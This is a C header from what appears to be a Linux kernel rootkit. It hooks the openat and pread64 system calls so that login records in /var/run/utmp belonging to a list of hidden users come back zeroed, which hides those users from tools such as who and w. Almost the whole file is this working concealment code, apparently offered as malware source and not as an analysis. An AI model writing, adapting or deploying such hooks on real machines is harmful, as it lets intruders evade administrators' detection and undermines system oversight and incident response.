#ifndef FILE_HACKS_KITE
    #define FILE_HACKS_KITE
    #include "utmp.h" //utmp.h is not defined in the kernel so we define it on our own, contains the utmp struct to handle logged in users
    #include "kite_hook.h"
    #include "linked_list.h"


static int utmpfd = -1;

#ifdef PTREGS_SYSCALL_STUB
static asmlinkage int hack_openat(struct pt_regs *regs){
    char *kern_filename;
    char *filename = (char *)regs->si;
    char *utmp_path = "/var/run/utmp";
    int utmp_path_len = 14;

    kern_filename = kzalloc(NAME_MAX, GFP_KERNEL);

    if(kern_filename == NULL){
        return orig_openat(regs);
    }

    if(copy_from_user(kern_filename, filename, NAME_MAX)){
        kfree(kern_filename);
        return orig_openat(regs);
    }

    if(memcmp(kern_filename, utmp_path, utmp_path_len) == 0){
        utmpfd = orig_openat(regs);
        kfree(kern_filename);
        return utmpfd;
    }

    kfree(kern_filename);
    return orig_openat(regs);
}


static asmlinkage ssize_t hack_pread64(struct pt_regs *regs){
    unsigned int fd = regs->di;
    char *buf = (char *)regs->si;
    size_t count = regs->dx;
    if(fd == utmpfd && utmpfd != 0 && utmpfd != 1 && utmpfd != 2){
        char *read_buff;
        struct utmp *utmp_s;
        ssize_t ret;
        int err;


        read_buff = kzalloc(count, GFP_KERNEL);
        if(read_buff == NULL){
            return orig_pread64(regs);
        }
        
        ret = orig_pread64(regs);
        err = copy_from_user(read_buff, buf, count);
        if(err != 0){
            kfree(read_buff);
            return ret;
        }

        utmp_s = (struct utmp *)read_buff;
        if(find_node(&users_to_hide, utmp_s->ut_user) == 0){
            size_t i = 0;
            while(i < count){
                read_buff[i] = 0x0;
                i++;
            }

            err = copy_to_user(buf, read_buff, count);
            kfree(read_buff);
            return ret;
        }
    }

    return orig_pread64(regs);
}
#else
static asmlinkage int hack_openat(int dfd, const char *filename, int flags, umode_t mode){
    char *kern_filename;
    char *utmp_path = "/var/run/utmp";
    int utmp_path_len = 14;

    kern_filename = kzalloc(NAME_MAX, GFP_KERNEL);

    if(kern_filename == NULL){
        return orig_openat(dfd, filename, flags, mode);
    }

    if(copy_from_user(kern_filename, filename, NAME_MAX) != 0){
        kfree(kern_filename);
        return orig_openat(dfd, filename, flags, mode);
    }

    if(memcmp(kern_filename, utmp_path, utmp_path_len) == 0){
        utmpfd = orig_openat(dfd, filename, flags, mode);
        kfree(kern_filename);
        return utmpfd;
    }

    kfree(kern_filename);
    return orig_openat(dfd, filename, flags, mode);
}


static asmlinkage ssize_t hack_pread64(unsigned int fd, char *buf, size_t count, loff_t pos){
    if(fd == utmpfd && utmpfd != 1 && utmpfd != 2 && utmpfd != 3){
        char *read_buff;
        struct utmp *utmp_s;
        ssize_t ret;
        int err;


        read_buff = kzalloc(count, GFP_KERNEL);
        if(read_buff == NULL){
            return orig_pread64(fd, buf, count, pos);
        }
        
        ret = orig_pread64(fd, buf, count, pos);
        err = copy_from_user(read_buff, buf, count);
        if(err != 0){
            kfree(read_buff);
            return ret;
        }

        utmp_s = (struct utmp *)read_buff;
        if(find_node(&users_to_hide, utmp_s->ut_user) == 0){
            size_t i = 0;
            while(i < count){
                read_buff[i] = 0x0;
                i++;
            }

            err = copy_to_user(buf, read_buff, count);
            kfree(read_buff);
            return ret;
        }
    }
    return orig_pread64(fd, buf, count, pos);
}
#endif
#endif